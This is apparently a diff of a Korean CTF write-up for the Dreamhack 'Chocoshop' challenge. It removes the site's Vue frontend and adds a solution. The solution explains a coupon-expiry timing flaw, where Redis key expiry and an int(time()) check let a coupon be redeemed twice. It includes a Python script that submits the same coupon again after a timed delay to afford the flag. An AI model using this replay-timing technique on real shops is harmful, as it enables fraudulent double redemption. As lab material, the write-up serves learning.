@@ -149,318 +149,68 @@ def images(path):
 
 ```
 
-<br>
-
-```javascript
-<script>
-Vue.use(Vuex);
-
-function checkStatus(res) {
-  if (res.status >= 200 && res.status < 300) {
-    return res;
-  }
-
-  var error = new Error(res.statusText);
-  error.res = res;
-  throw error;
-}
-
-function parseJSON(res) {
-  return res.json();
-}
-
-
-const store = new Vuex.Store({
-  state: {
-    page: null,
-    session: '',
-    user: null,
-  },
-
-  mutations: {
-    setPage(state, page) {
-      state.page = page;
-    },
-
-    setSessionId(state, sessionId) {
-      window.localStorage.setItem('session-id', sessionId);
-      state.session = sessionId;
-    },
-
-    setUser(state, user) {
-      state.user = user;
-    },
-  },
-
-  actions: {
-    init(context) {
-      const sessionId = window.localStorage.getItem('session-id');
-      context.commit('setSessionId', sessionId);
-
-      if (sessionId) {
-        context.dispatch('getMe')
-          .then(() => {
-            context.commit('setPage', 'has-session');
-          })
-          .catch(err => {
-            context.commit('setSessionId', '');
-            context.commit('setPage', 'no-session');
-          });
-      } else {
-        context.commit('setPage', 'no-session');
-      }
-    },
-
-    navigate(context, page) {
-      context.commit('setPage', page);
-    },
-
-    getSessionId(context) {
-      return fetch('/session')
-        .then(checkStatus)
-        .then(parseJSON)
-        .then(body => {
-          context.commit('setSessionId', body.session);
-          context.dispatch('getMe');
-        });
-    },
-
-    getMe(context) {
-      return fetch('/me', { headers: { Authorization: context.state.session } })
-        .then(checkStatus)
-        .then(parseJSON)
-        .then(body => {
-          context.commit('setUser', body);
-        });
-    },
-
-    claimCoupon(context) {
-      return fetch('/coupon/claim', { headers: { Authorization: context.state.session } })
-        .then(checkStatus)
-        .then(parseJSON)
-        .then(body => {
-          return body.coupon;
-        });
-    },
-
-    submitCoupon(context, coupon) {
-      return fetch('/coupon/submit', { headers: { Authorization: context.state.session, coupon: coupon } })
-        .then(checkStatus)
-        .then(parseJSON)
-        .then(body => {
-          return body.status;
-        });
-    },
-
-    claimProduct(context, id) {
-      return fetch(`/${id}/claim`, { headers: { Authorization: context.state.session } })
-        .then(checkStatus)
-        .then(parseJSON)
-        .then(body => {
-          return body.message;
-        });
-    },
-  }
-});
-
-
-Vue.component('app-header', {
-  template: `
-    <header class="app-header">
-      <nav class="navbar is-dark">
-        <div class="navbar-brand">
-          <a href="/" class="navbar-item">Chocoshop</a>
-        </div>
-
-        <div v-if="user" class="navbar-end">
-          <div class="navbar-item">
-            {{ user.uuid }}
-          </div>
-          <div class="navbar-item">
-            £{{ user.money }}
-          </div>
-        </div>
-      </nav>
-    </header>
-  `,
-
-  computed: {
-    user() { return this.$store.state.user; },
-  },
-});
-
-Vue.component('no-session', {
-  template: `
-    <div>
-      <h1 class="title">Session Required</h1>
-      <p class="mb-4">Session is required for further access</p>
-      <button class="button is-info is-large is-fullwidth" @click="acquireSession">Acquire Session</button>
-    </div>
-  `,
-
-  methods: {
-    acquireSession() {
-      this.$store.dispatch('getSessionId');
-      this.$store.dispatch('navigate', 'has-session');
-    },
-  },
-});
-
-Vue.component('has-session', {
-  template: `
-    <div>
-      <button class="button is-success is-large" @click="navigate('shop')">SHOP</button>
-      <button class="button is-warning is-large" @click="navigate('mypage')">MYPAGE</button>
-    </div>
-  `,
-
-  methods: {
-    navigate(page) {
-      this.$store.dispatch('navigate', page);
-    },
-  }
-});
-
-Vue.component('page-shop', {
-  template: `
-    <div>
-      <h2 class="title">Welcome to Chocoshop!</h2>
-
-      <hr>
-
-      <div class="products">
-        <div v-for="product in products" :key="product.id" class="product" @click="claimProduct(product.id)">
-          <img :src="\`/images/\${product.id}.jpg\`">
-          <h3 class="name">{{ product.name }} (£{{ product.price }})</h3>
-          <p class="description">{{ product.description }}</p>
-        </div>
-      </div>
-    </div>
-  `,
-
-  data() {
-    return {
-      products: [
-        { id: 'pepero', name: 'Pepero', description: 'Do you guys not have Peperos?', price: 1500 },
-        { id: 'flag', name: 'Flag', description: 'Get your flag!', price: 2000 },
-      ],
-    }
-  },
-
-  methods: {
-    claimProduct(id) {
-      this.$store.dispatch('claimProduct', id)
-        .then(message => {
-          alert(message);
-          this.$store.dispatch('getMe');
-        })
-        .catch(err => {
-          if (err.res) {
-            err.res.json().then(body => {
-              alert(body.message);
-            });
-          } else {
-            alert(err.message);
-          }
-        });
-    },
-  },
-});
-
-Vue.component('page-mypage', {
-  template: `
-    <div>
-      <h2 class="title">My Page</h2>
-
-      <hr class="my-6">
-
-      <h3 class="subtitle">Coupon Claim</h3>
-      <button class="button is-info is-large is-fullwidth" @click="claimCoupon">Claim</button>
-      <textarea v-model="couponClaimed" class="textarea" type="text" placeholder="Your Coupon" readonly></textarea>
-
-      <hr class="my-6">
-
-      <h3 class="subtitle">Coupon Submit</h3>
-      <textarea v-model="couponSubmit" class="textarea" type="text" placeholder="Enter Your Coupon"></textarea>
-      <button class="button is-success is-large is-fullwidth" @click="submitCoupon">Submit</button>
-    </div>
-  `,
-
-  data() {
-    return {
-      couponClaimed: '',
-      couponSubmit: '',
-    };
-  },
-
-  methods: {
-    claimCoupon() {
-      this.$store.dispatch('claimCoupon')
-        .then(coupon => {
-          this.couponClaimed = coupon;
-          this.$store.dispatch('getMe');
-        })
-        .catch(err => {
-          if (err.res) {
-            err.res.json().then(body => {
-              alert(body.message);
-            });
-          } else {
-            alert(err.message);
-          }
-        });
-    },
-
-    submitCoupon() {
-      this.$store.dispatch('submitCoupon', this.couponSubmit)
-        .then(coupon => {
-          alert('Coupon submitted!');
-          this.couponSubmit = '';
-          this.$store.dispatch('getMe');
-        })
-        .catch(err => {
-          if (err.res) {
-            err.res.json().then(body => {
-              alert(body.message);
-            });
-          } else {
-            alert(err.message);
-          }
-        });
-    },
-  },
-});
-
-Vue.component('main-content', {
-  template: `
-    <div class="page-content">
-      <no-session v-if="page === 'no-session'" />
-      <has-session v-if="page === 'has-session'" />
-      <page-shop v-if="page === 'shop'" />
-      <page-mypage v-if="page === 'mypage'" />
-    </div>
-  `,
-
-  computed: {
-    page() { return this.$store.state.page; },
-  },
-});
-
-const app = new Vue({
-  el: '#app',
-  store: store,
-
-  created() {
-    this.$store.dispatch('init');
-  },
-});
-</script>
-```
-
 <br><br>
 
 ## Solution
 ---
 
+timing을 맞춰야 하는데 코드를 보면 쿠폰을 생성하면 만료 시간이 설정되고, 쿠폰을 제출하면 두 개의 키가 redis에 등록되는데 두 번째 키가 중요하다.
 
+두 번째 키의 만료 시간을 보면 쿠폰의 만료 시간에서 현재 시간을 뺀다.
 
+즉, 두 번째 키는 쿠폰이 만료되는 시점에 없어진다고 보면 되는데.. 
+
+```coupon['expiration'] < int(time()): raise BadRequest('Coupon expired!')``` 이 부분을 생각해보자.
+
+<br>
+
+쿠폰을 만든 시점이 정확히 100초라 할 때, 쿠폰 만료 시점은 정확히 145초이고 키 또한 정확히 145초에 만료된다.
+
+지금이 정확히 145초라고 치면 일단 키는 만료되었는데, ```int(time())```부분에서 만약 ```time()``` 값이 ```145.1 ~ 145.9```초 사이에 있다고 하자.
+
+이 시점에선 어차피 int를 통해 145초가 되므로 ```145<145```가 조건문을 통과할 수 있으며, 이미 145초를 지난, ```145.1 ~ 145.9```초 사이에 있으므로 두 번째 키 또한 만료되었다.
+
+따라서 돈을 천원 더 넣을 수 있게 되어 2000원이 되므로 플래그를 사면 플래그를 alert 해준다.
+
+<br>
+
+```python
+import requests
+import time
+import json
+
+url = 'http://host3.dreamhack.games:{port}/coupon/claim'
+headers = {
+    "Authorization": "{uuid}",
+    "Content-Type": "application/json, application/x-www-form-urlencoded"
+}
+
+res = requests.get(url, headers=headers)
+# coupon_expire_time = int(time.time()) + 44.2
+
+'''
+코드 상으로는 res가 받은 시점에서는 이미 쿠폰은 생성된지 조금이라도 시간이 지나있다.
+
+이 부분을 유의해서 쿠폰 만료 시간을 계산한 것.
+'''
+
+coupon = json.loads(res.text)
+headers["coupon"] = coupon["coupon"]
+
+url = 'http://host3.dreamhack.games:21345/coupon/submit'
+res = requests.get(url, headers=headers)
+
+'''
+while (1):
+    print("wait...")
+    if (int(time()) == coupon_expire_time):  ---> 이 걸로 하면 키가 만료 되기 전에 보내지므로 안됨.
+        res = requests.get(url, headers=headers)
+        print(res.text)
+        break
+'''
+
+time.sleep(44.2) 
+# 쿠폰이 만료될 시점을 고려해서 키는 없어졌지만 아직 쿠폰 만료 시간과 int(time) 값이 동일할 때 보내야 함
+res = requests.get(url, headers=headers)
+print(res.text)
+```
